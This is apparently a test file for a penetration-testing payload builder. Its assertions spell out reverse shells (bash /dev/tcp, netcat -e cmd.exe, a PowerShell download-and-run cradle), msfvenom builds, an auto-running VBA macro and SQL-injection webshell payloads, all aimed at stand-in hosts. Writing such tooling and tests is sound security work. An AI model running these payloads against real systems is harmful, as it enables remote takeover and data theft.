import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { PASTE_CONTEXTS, wrapForContext, type PasteContext } from "../../../engines/payloads/context";
import { decodeUtf16leBase64, urlEncodeShell } from "../../../engines/payloads/encode";
import { rankPayloads, type PayloadSituation } from "../../../engines/payloads/fit";
import { failedPayloadIds, staleBuild } from "../../../engines/payloads/memory";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
import { buildSql } from "../../../engines/payloads/sql";
import type { BuiltPayload, PayloadDef } from "../../../engines/payloads/types";
import { UPGRADE } from "../../../engines/payloads/upgrade";
import type { LogEntry } from "../../../types/log";

// Synthetic fixtures only.
const V = { LHOST: "192.0.2.10", LPORT: "443" };
const byId = (defs: PayloadDef[], id: string) => {
  const d = defs.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};
const shell = (id: string) => byId(REVERSE_SHELLS, id);
const msf = (id: string) => byId(MSFVENOM, id);
const base: PayloadSituation = {
  os: null, services: [], prompt: null, webShellUrl: null, tools: { present: [], absent: [] },
  failedPayloadIds: [], exam: false, dbEngine: null,
};
const URL_CONTEXTS: PasteContext[] = ["url-param", "webshell-param"];
/** The text as the target sees it: a URL context decoded (+ is a space). */
const plain = (b: BuiltPayload, ctx: PasteContext) => (URL_CONTEXTS.includes(ctx) ? decodeURIComponent(b.text.replace(/\+/g, " ")) : b.text);

describe("Java WAR: one any-OS def", () => {
  it("is a single msf-java-war def with os any", () => {
    expect(MSFVENOM.filter((d) => d.template.includes("-f war")).map((d) => d.id)).toEqual(["msf-java-war"]);
    expect(msf("msf-java-war").os).toBe("any");
  });
  it.each([["windows" as const], ["linux" as const], [null]])("OS %s lists it as a fit once", (os) => {
    const r = rankPayloads(MSFVENOM, { ...base, os }, null);
    expect(r.fits.filter((d) => d.template.includes("-f war"))).toHaveLength(1);
    expect(r.misfits.filter((m) => m.def.template.includes("-f war"))).toEqual([]);
  });
  it("builds the exact command; the note browses to the file's stem", () => {
    const b = buildPayload(msf("msf-java-war"), "bash-prompt", V);
    expect(b.text).toBe("msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f war -o rev.war");
    expect(b.notes.join(" ")).toContain("/rev/");
    const named = buildPayload(msf("msf-java-war"), "bash-prompt", { ...V, FILE: "/tmp/zzapp.war" });
    expect(named.text).toBe("msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f war -o /tmp/zzapp.war");
    expect(named.notes.join(" ")).toContain("/zzapp/");
    expect(named.notes.join(" ")).not.toContain("/rev/");
    expect(named.parts.some((p) => p.token === "-o /tmp/zzapp.war")).toBe(true);
  });
  it("a failure or build logged under the old per-OS ids still counts for the merged def", () => {
    const at = 1;
    const e: LogEntry = {
      id: "l1", engagementId: "e1", kind: "command", title: "t", titleEdited: false, ranOn: null, hostIds: ["h1"],
      observations: null, returnedNothing: true, private: false, at, createdAt: at, updatedAt: at, payloadId: "msf-java-war-linux",
      content: { kind: "command", blocks: [{ command: "x", output: "" }] },
    };
    expect(failedPayloadIds([e], "h1")).toEqual(["msf-java-war"]);
    const rec = { engagementId: "e1", hostId: "h1", payloadId: "msf-java-war-windows", lhost: "192.0.2.9", lport: "443", at };
    expect(staleBuild([rec], "h1", "msf-java-war", V)).toEqual({ was: "192.0.2.9:443", now: "192.0.2.10:443" });
  });
});

describe("msfvenom hints", () => {
  it("the DLL says any export name works with rundll32 (DllMain)", () => {
    const n = buildPayload(msf("msf-win-x64-dll"), "bash-prompt", V).notes.join(" ");
    expect(n).toContain("rundll32 C:\\path\\to\\rev.dll,x");
    expect(n).toContain("DllMain");
  });
  it("the HTA recommends the 64-bit mshta and says the SysWOW64 one is 32-bit", () => {
    const n = buildPayload(msf("msf-win-x64-hta"), "bash-prompt", V).notes.join(" ");
    expect(n).toContain("C:\\Windows\\System32\\mshta.exe");
    expect(n).toMatch(/SysWOW64.*32-bit/);
  });
});

describe("ps-b64: the encoded script is explained", () => {
  it("has decoded parts for TCPClient, the read loop, iex and the PS prompt, each found in the decoded script", () => {
    const b = buildPayload(shell("ps-b64"), "cmd", V);
    const script = decodeUtf16leBase64(/-e (\S+)$/.exec(b.text)![1]!);
    const decoded = b.parts.filter((p) => p.decoded);
    expect(decoded.map((p) => p.token)).toEqual([
      'TCPClient("192.0.2.10",443)', "$stream.Read(", "iex $data", '"PS " + (pwd).Path + "> "',
    ]);
    for (const p of decoded) expect(script).toContain(p.token);
    for (const p of b.parts.filter((x) => !x.decoded)) expect(b.text).toContain(p.token);
  });
});

describe("nc-exe and Nishang", () => {
  it("nc-exe's file part follows FILE (nc64.exe)", () => {
    const b = buildPayload(shell("nc-exe"), "cmd", { ...V, FILE: "C:\\Windows\\Temp\\nc64.exe" });
    expect(b.text).toBe("C:\\Windows\\Temp\\nc64.exe -e cmd.exe 192.0.2.10 443");
    for (const p of b.parts) expect(b.text, p.token).toContain(p.token);
    expect(b.parts[0]!.token).toBe("C:\\Windows\\Temp\\nc64.exe");
  });
  it("the Nishang 'quotes doubled' note shows only in sql-string", () => {
    const d = shell("nishang-cradle");
    for (const ctx of d.contexts) {
      const has = buildPayload(d, ctx, V).notes.some((n) => /quotes are doubled/.test(n));
      expect(has, ctx).toBe(ctx === "sql-string");
    }
  });
  it("the Nishang prepare part names the filled echo line", () => {
    const b = buildPayload(shell("nishang-cradle"), "cmd", V);
    for (const p of b.parts.filter((x) => x.token.startsWith("echo"))) expect(b.prepare).toContain(p.token);
  });
});

describe("every text part token appears in its built text", () => {
  for (const d of [...REVERSE_SHELLS, ...MSFVENOM, ...UPGRADE]) {
    it(d.id, () => {
      const values = { ...V, USER: "zzuser", TARGET_IP: "198.51.100.20", BIND_PORT: "4444" };
      const seen = d.contexts.flatMap((ctx) => {
        const b = buildPayload(d, ctx, values);
        return [plain(b, ctx), b.prepare ?? ""];
      }).join("\n");
      const b = buildPayload(d, d.contexts[0]!, values);
      for (const p of b.parts.filter((x) => !x.decoded)) {
        // bash -c only shows where a context wraps it.
        expect(p.token === "bash -c" || seen.includes(p.token), `${d.id}: ${p.token}`).toBe(true);
      }
    });
  }
});

describe("Upgrade steps", () => {
  it("every step has parts whose tokens appear in its text", () => {
    for (const d of UPGRADE) {
      expect(d.parts.length, d.id).toBeGreaterThan(0);
      const b = buildPayload(d, "bash-prompt", { USER: "zzuser" });
      for (const p of b.parts) expect(b.text, `${d.id}: ${p.token}`).toContain(p.token);
    }
  });
  it("{USER} stays unresolved until set", () => {
    const home = byId(UPGRADE, "upgrade-6-home");
    const b = buildPayload(home, "bash-prompt", V);
    expect(b.unresolved).toEqual(["USER"]);
    expect(b.text).toBe("export HOME=/home/{USER}");
    const set = buildPayload(home, "bash-prompt", { USER: "zzuser" });
    expect(set.unresolved).toEqual([]);
    expect(set.text).toBe("export HOME=/home/zzuser");
  });
  it("each step says which side it runs on; Ctrl-Z is the only keypress", () => {
    expect(UPGRADE.map((d) => [d.id, d.runsOn ?? "target"])).toEqual([
      ["upgrade-1-pty-python", "target"], ["upgrade-1-pty-script", "target"], ["upgrade-2-background", "kali"],
      ["upgrade-3-raw", "kali"], ["upgrade-4-term", "target"], ["upgrade-5-size", "target"], ["upgrade-6-home", "target"],
    ]);
    expect(UPGRADE.filter((d) => d.keypress).map((d) => d.id)).toEqual(["upgrade-2-background"]);
  });
});

describe("unresolved payloads are wrapped for their context", () => {
  const noHost = { LPORT: "443" };
  it("bash-tcp in url-param: bash -c and URL-encoded, {LHOST} readable", () => {
    const b = buildPayload(shell("bash-tcp"), "url-param", noHost);
    expect(b.text).toBe("bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F{LHOST}%2F443+0%3E%261%27");
    expect(b.unresolved).toEqual(["LHOST"]);
    expect(b.notes).toContain("Set LHOST first.");
    expect(b.notes).toContain("Wrapped in bash -c '...', then URL-encoded (spaces as +).");
  });
  it("bash-tcp in injected-linux and php-system", () => {
    expect(buildPayload(shell("bash-tcp"), "injected-linux", noHost).text).toBe("bash -c 'bash -i >& /dev/tcp/{LHOST}/443 0>&1'");
    expect(buildPayload(shell("bash-tcp"), "php-system", noHost).text).toBe("system('bash -c \\'bash -i >& /dev/tcp/{LHOST}/443 0>&1\\'');");
  });
  it("nishang in sql-string doubles quotes around {LHOST}", () => {
    expect(buildPayload(shell("nishang-cradle"), "sql-string", noHost).text).toBe(
      `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://{LHOST}/rev.ps1'')"`,
    );
  });
  it("only the base64 PowerShell keeps its stub", () => {
    const b = buildPayload(shell("ps-b64"), "url-param", noHost);
    expect(b.text).toBe("powershell -nop -w hidden -e <UTF-16LE base64 of the script, once {LHOST} is set>");
    expect(b.notes.some((n) => n.startsWith("Set LHOST first"))).toBe(true);
  });
  it("a filter waits until everything is set, and says so", () => {
    const b = buildPayload(shell("bash-tcp"), "injected-linux", noHost, { filter: "b64" });
    expect(b.text).toBe("bash -c 'bash -i >& /dev/tcp/{LHOST}/443 0>&1'");
    expect(b.notes.join(" ")).toContain("Filter applies once LHOST is set.");
  });
});

describe("URL encoding", () => {
  it("encodes newlines, tabs and non-ASCII", () => {
    expect(urlEncodeShell("a\nb\r\tc é")).toBe("a%0Ab%0D%09c+%C3%A9");
  });
  it("keeps only the named placeholders readable", () => {
    expect(urlEncodeShell("nc {LHOST} {IFS}", ["LHOST"])).toBe("nc+{LHOST}+%7BIFS%7D");
    expect(urlEncodeShell("nc {LHOST}")).toBe("nc+%7BLHOST%7D");
  });
  it("a custom SQL cmd's ${IFS} is encoded like any text", () => {
    const b = buildSql("postgres-copy-program", "postgres", "url-param", { cmd: "cat${IFS}/etc/passwd" });
    expect(b.text).toContain("cat$%7BIFS%7D%2Fetc%2Fpasswd");
    expect(b.text).not.toContain("{IFS}");
  });
  it("an unresolved SQL placeholder stays readable", () => {
    const b = buildSql("mysql-into-outfile-webshell", "mysql", "url-param", {});
    expect(b.unresolved).toContain("PATH");
    expect(b.text).toContain("{PATH}");
  });
});

describe("macro and injected-linux wrappers", () => {
  it("macro splits line breaks into vbCrLf and keeps & and doubled quotes", () => {
    expect(wrapForContext('echo "a" & b\r\nwhoami', "macro", "windows").text).toBe([
      "Sub MyMacro()", "    Dim Str As String",
      '    Str = Str + "echo ""a"" & b"', "    Str = Str + vbCrLf", '    Str = Str + "whoami"',
      '    CreateObject("Wscript.Shell").Run Str', "End Sub", "",
      "Sub AutoOpen()", "    MyMacro", "End Sub", "",
      "Sub Document_Open()", "    MyMacro", "End Sub",
    ].join("\n"));
  });
  it("injected-linux applies bash -c only for Linux", () => {
    expect(wrapForContext("whoami", "injected-linux", "linux").text).toBe("bash -c 'whoami'");
    expect(wrapForContext("whoami", "injected-linux", "windows").text).toBe("whoami");
  });
  it("an any-OS def in injected-linux follows the chosen OS", () => {
    const d: PayloadDef = {
      id: "t-any", generator: "shell", title: "t", os: "any", contexts: ["injected-linux"], requires: [],
      template: "whoami", parts: [], listeners: [],
    };
    expect(buildPayload(d, "injected-linux", {}, { os: "windows" }).text).toBe("whoami");
    expect(buildPayload(d, "injected-linux", {}, { os: "linux" }).text).toBe("bash -c 'whoami'");
  });
  it("every context still has a wrapper", () => {
    for (const c of PASTE_CONTEXTS) expect(wrapForContext("id", c.id, "linux").notes.length).toBeGreaterThan(0);
  });
});
